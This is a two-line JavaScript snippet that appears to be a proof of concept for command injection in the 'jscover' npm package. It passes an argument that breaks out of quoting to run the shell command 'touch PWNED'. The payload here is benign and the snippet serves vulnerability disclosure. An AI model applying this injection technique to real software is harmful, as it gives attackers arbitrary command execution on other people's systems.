const jscover = require("jscover")
jscover("", "\"; touch PWNED\"", "", () => {})